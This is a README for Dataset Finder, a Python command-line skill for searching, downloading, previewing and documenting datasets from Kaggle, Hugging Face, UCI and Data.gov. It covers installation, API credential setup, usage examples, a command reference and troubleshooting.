# Dataset Finder

A powerful OpenClaw skill for discovering, downloading, and managing datasets from multiple repositories.

## Features

✅ **Multi-Repository Search**
- Kaggle (ML competitions & community datasets)
- Hugging Face (NLP, vision, audio datasets)
- UCI ML Repository (classic ML datasets)
- Data.gov (US government open data)

✅ **Smart Download**
- Automatic format detection
- Multiple format support (CSV, JSON, Parquet, Excel)
- Batch downloading
- Progress tracking

✅ **Dataset Preview**
- Quick statistics without full load
- Column types and missing values
- Sample data inspection
- Memory usage estimation

✅ **Documentation Generation**
- Auto-generate data cards
- Schema documentation
- Usage examples
- Statistics summaries

## Installation

### Prerequisites

1. Install [OpenClawCLI](https://clawhub.ai/) for Windows or MacOS

2. Install Python dependencies:

```bash
# Standard installation
pip install kaggle datasets pandas huggingface-hub requests beautifulsoup4

# Or install from requirements.txt
pip install -r requirements.txt
```

**Using Virtual Environment (Recommended):**

```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt
```

⚠️ **Never use `--break-system-packages`** - use virtual environments instead!

### API Credentials

#### Kaggle Setup

1. Go to https://www.kaggle.com/settings
2. Click "Create New API Token"
3. Save `kaggle.json` to:
   - Linux/Mac: `~/.kaggle/`
   - Windows: `%USERPROFILE%\.kaggle\`
4. Set permissions (Linux/Mac): `chmod 600 ~/.kaggle/kaggle.json`

#### Hugging Face Setup (Optional)

```bash
# Login via CLI
huggingface-cli login

# Or set environment variable
export HF_TOKEN="your_token_here"
```

## Quick Start

### Search Datasets

```bash
# Search Kaggle
python scripts/dataset.py kaggle search "house prices"

# Search Hugging Face
python scripts/dataset.py huggingface search "sentiment analysis"

# Search UCI ML Repository
python scripts/dataset.py uci search "classification"
```

### Download Datasets

```bash
# Download from Kaggle
python scripts/dataset.py kaggle download "zillow/zecon"

# Download from Hugging Face
python scripts/dataset.py huggingface download "imdb"

# Download from UCI
python scripts/dataset.py uci download "iris"
```

### Preview and Document

```bash
# Preview dataset
python scripts/dataset.py preview data.csv --detailed

# Generate data card
python scripts/dataset.py datacard data.csv --output DATACARD.md
```

## Common Use Cases

### 1. ML Project Setup

```bash
# Search for datasets
python scripts/dataset.py kaggle search "housing prices" --max-results 10

# Download selected dataset
python scripts/dataset.py kaggle download "zillow/zecon"

# Preview the data
python scripts/dataset.py preview datasets/kaggle/zillow_zecon/train.csv --detailed

# Generate documentation
python scripts/dataset.py datacard datasets/kaggle/zillow_zecon/train.csv
```

### 2. NLP Dataset Collection

```bash
# Search for sentiment datasets
python scripts/dataset.py huggingface search "sentiment" --task text-classification --language en

# Download multiple datasets
python scripts/dataset.py huggingface download "imdb"
python scripts/dataset.py huggingface download "sst2"
python scripts/dataset.py huggingface download "yelp_polarity"
```

### 3. Dataset Comparison

```bash
# Search multiple sources
python scripts/dataset.py kaggle search "titanic" --output kaggle_results.json
python scripts/dataset.py huggingface search "titanic" --output hf_results.json

# Compare results
cat kaggle_results.json hf_results.json | jq '.'
```

### 4. Build Dataset Library

```bash
# Create organized structure
mkdir -p datasets/{kaggle,huggingface,uci}

# Download datasets
python scripts/dataset.py kaggle download "dataset1" --output-dir datasets/kaggle/
python scripts/dataset.py huggingface download "dataset2" --output-dir datasets/huggingface/

# Generate data cards for all
for file in datasets/**/*.csv; do
  python scripts/dataset.py datacard "$file" --output "${file%.csv}_DATACARD.md"
done
```

## Repository-Specific Features

### Kaggle

```bash
# Search with filters
python scripts/dataset.py kaggle search "NLP" \
  --file-type csv \
  --sort-by hotness \
  --max-results 20

# Download specific files
python scripts/dataset.py kaggle download "owner/dataset" --file "train.csv"

# List dataset files
python scripts/dataset.py kaggle list "owner/dataset"
```

### Hugging Face

```bash
# Search with task filter
python scripts/dataset.py huggingface search "text" \
  --task text-classification \
  --language en \
  --max-results 15

# Download specific split
python scripts/dataset.py huggingface download "imdb" --split train

# Download with configuration
python scripts/dataset.py huggingface download "glue" --config mrpc

# Stream large datasets
python scripts/dataset.py huggingface download "large-dataset" --streaming
```

### UCI ML Repository

```bash
# Search by task type
python scripts/dataset.py uci search "regression" --task-type regression

# Search by size
python scripts/dataset.py uci search "classification" --min-samples 1000

# Download classic datasets
python scripts/dataset.py uci download "iris"
python scripts/dataset.py uci download "wine-quality"
```

## Dataset Preview Features

### Basic Preview

```bash
python scripts/dataset.py preview data.csv
```

**Shows:**
- Dataset shape (rows × columns)
- Column names and types
- Missing value counts
- Memory usage
- Sample rows

### Detailed Preview

```bash
python scripts/dataset.py preview data.csv --detailed
```

**Additional information:**
- Numeric statistics (mean, std, min, max)
- Categorical value counts
- Unique value counts
- Top values per column

### Save Preview

```bash
python scripts/dataset.py preview data.csv --detailed --output preview.txt
```

## Data Card Generation

Generate professional dataset documentation:

```bash
# Basic data card
python scripts/dataset.py datacard dataset.csv --output DATACARD.md

# Include statistics
python scripts/dataset.py datacard dataset.csv --include-stats --output README.md
```

**Generated data card includes:**
- Dataset description
- File information
- Schema table
- Statistics (if enabled)
- Sample data
- Usage examples
- License placeholder
- Citation placeholder

## Supported File Formats

**Reading:**
- CSV, TSV
- JSON, JSONL
- Parquet
- Excel (XLSX, XLS)
- HDF5
- Feather

**Writing:**
- CSV
- JSON
- Parquet
- Markdown (data cards)

## Command Reference

```bash
python scripts/dataset.py <command> <subcommand> [OPTIONS]

KAGGLE:
  kaggle search QUERY       Search Kaggle datasets
    --file-type TYPE        Filter by file type
    --license LICENSE       Filter by license
    --sort-by SORT          Sort by (hotness|votes|updated|relevance)
    --max-results N         Limit results
    --output FILE           Save to JSON
  
  kaggle download DATASET   Download dataset
    --file FILE             Download specific file
    --output-dir DIR        Output directory
  
  kaggle list DATASET       List dataset files

HUGGING FACE:
  huggingface search QUERY  Search HF datasets
    --task TASK             Filter by task
    --language LANG         Filter by language
    --max-results N         Limit results
    --output FILE           Save to JSON
  
  huggingface download ID   Download dataset
    --split SPLIT           Specific split
    --config CONFIG         Configuration
    --streaming             Stream mode
    --output-dir DIR        Output directory

UCI:
  uci search QUERY          Search UCI datasets
    --task-type TYPE        Filter by task
    --min-samples N         Minimum samples
  
  uci download ID           Download dataset
    --output-dir DIR        Output directory

PREVIEW:
  preview FILE              Preview dataset
    --detailed              Detailed stats
    --sample N              Sample size
    --output FILE           Save output

DATACARD:
  datacard FILE             Generate data card
    --output FILE           Output file
    --include-stats         Include statistics
```

## Best Practices

### Search Strategy
1. Start with broad keywords
2. Use filters to narrow results
3. Check multiple repositories
4. Review metadata before downloading

### Download Management
1. Organize by repository
2. Check dataset size first
3. Use descriptive directory names
4. Keep original file structures

### Data Quality
1. Always preview before using
2. Generate data cards for documentation
3. Check for missing values
4. Validate data types

### Storage
1. Use Parquet for large datasets
2. Compress when possible
3. Keep separate train/test/val sets
4. Version control dataset metadata

## Troubleshooting

### "Kaggle API credentials not found"

```bash
# Download from https://www.kaggle.com/settings
# Place in ~/.kaggle/kaggle.json (Linux/Mac)
# Or %USERPROFILE%\.kaggle\kaggle.json (Windows)

# Set permissions (Linux/Mac)
chmod 600 ~/.kaggle/kaggle.json
```

### "Library not installed"

```bash
pip install kaggle datasets pandas huggingface-hub requests beautifulsoup4
```

### "Download failed"

- Check internet connection
- Verify dataset still exists
- Check available disk space
- Try downloading specific files

### "Cannot load dataset"

- Verify file format
- Check file encoding
- Ensure file is not corrupted
- Try different reader options

### "Out of memory"

- Use streaming mode for large datasets
- Preview with smaller sample size
- Use Parquet instead of CSV
- Process in chunks

## Tips and Tricks

### Quick Dataset Search

```bash
# Create alias for common searches
alias kaggle-search='python scripts/dataset.py kaggle search'
alias hf-search='python scripts/dataset.py huggingface search'

# Use them
kaggle-search "house prices"
hf-search "sentiment"
```

### Batch Operations

```bash
# Search and save results
python scripts/dataset.py kaggle search "ML" --output results.json

# Extract dataset IDs
cat results.json | jq -r '.[].owner' > datasets.txt

# Download all
while read dataset; do
  python scripts/dataset.py kaggle download "$dataset"
done < datasets.txt
```

### Preview Multiple Files

```bash
# Preview all CSV files
for file in *.csv; do
  echo "=== $file ==="
  python scripts/dataset.py preview "$file"
done
```

## Version

0.1.0 - Initial release

## License

Proprietary - See LICENSE.txt

## Credits

Built for OpenClaw using:
- [kaggle](https://github.com/Kaggle/kaggle-api) - Kaggle API
- [datasets](https://github.com/huggingface/datasets) - Hugging Face Datasets
- [pandas](https://pandas.pydata.org/) - Data analysis
- [requests](https://requests.readthedocs.io/) - HTTP library
- [BeautifulSoup](https://www.crummy.com/software/BeautifulSoup/) - Web scraping